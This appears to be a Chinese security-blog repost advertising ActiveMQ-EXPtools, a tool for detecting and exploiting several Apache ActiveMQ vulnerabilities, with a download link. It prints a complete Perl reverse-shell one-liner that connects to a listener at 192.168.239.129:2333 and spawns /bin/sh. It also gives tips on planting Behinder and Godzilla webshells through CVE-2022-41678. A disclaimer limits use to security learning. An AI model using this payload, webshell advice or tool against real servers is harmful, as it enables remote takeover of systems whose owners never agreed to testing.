#  ActiveMQ-EXPtools | Apache ActiveMQ全系列漏洞一键支持检测和利用工具  
 黑白之道   2026-04-22 01:16  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
## 工具介绍  
  
**ActiveMQ-EXPtools**  
支持检测和利用Apache ActiveMQ漏洞，CVE-2015-5254，CVE-2016-3088，CVE-2022-41678，CVE-2023-46604，CVE-2024-32114，CVE-2026-34197。作者：Catherines77  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/ft6csZH0gNUuUyCWQLicWkP41vMYWOJoVehCoicNY6Xw8tibB5UeSXrUzj1VnG5P7AsBPqoW50s6wSK9CcF0QuWjr5x34sUvB0gbTvmPTxwcGc/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic&watermark=1#imgIndex=0 "")  
## 漏洞利用说明  
### CVE-2015-5254  
  
java-chains生成反序列化数据，验证漏洞时可以用URLDNS  
  
在反弹shell时最好用perl，sh和bash有时弹不了  
```
/usr/bin/perl -e 'use Socket;$i="192.168.239.129";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ft6csZH0gNUwianL6MtXACopPNSlfQ077docCdU8JZkjzvCSuj72guovHKUuufO7bHgVEEcia5bIGqVfg6mNoMsVmIDHwQVouroq5J9oulXTY/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=1 "")  
### CVE-2022-41678  
  
自定义webshell写入时，冰蝎马写入会报500，哥斯拉正常。工具连接时注意要加上认证头部  
  
**参考致谢**  
  
https://github.com/URJACK2025/CVE-2022-41678  
  
https://github.com/vulhub/vulhub  
  
https://github.com/vulhub/java-chains  
## 工具下载  
```
https://github.com/Catherines77/ActiveMQ-EXPtools/releases/tag/1.0
```  
  
  
> **文章来源：李白你好**  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
